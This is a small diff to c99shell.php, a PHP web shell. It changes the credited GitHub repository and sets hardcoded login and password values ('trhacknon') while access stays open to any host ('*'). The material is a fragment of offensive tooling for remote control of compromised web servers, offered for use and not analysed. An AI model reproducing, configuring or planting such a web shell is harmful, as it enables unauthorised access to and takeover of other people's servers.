@@ -16,7 +16,7 @@ _/ ___\____    /\____    /  \_____  \ |  |  \_/ __ \|  | |  |   \  \/ /   /  ___
         __/ |                                                       
        |___/                                                        
 *			c99shell.php v.2.0 (PHP 7) (25.02.2019) Updated by: KaizenLouie for PHP 7
-*			https://github.com/KaizenLouie/C99Shell-PHP7
+*			https://github.com/trhacknon/C99Shell-PHP7
 ******************************************************************************************************
 */
 
@@ -113,8 +113,8 @@ if (empty($surl))
 }
 $surl = htmlspecialchars($surl);
 $timelimit = 0;
-$login = "";
-$pass = "";
+$login = "trhacknon";
+$pass = "trhacknon";
 $md5_pass = "";
 $host_allow = array(
     "*"
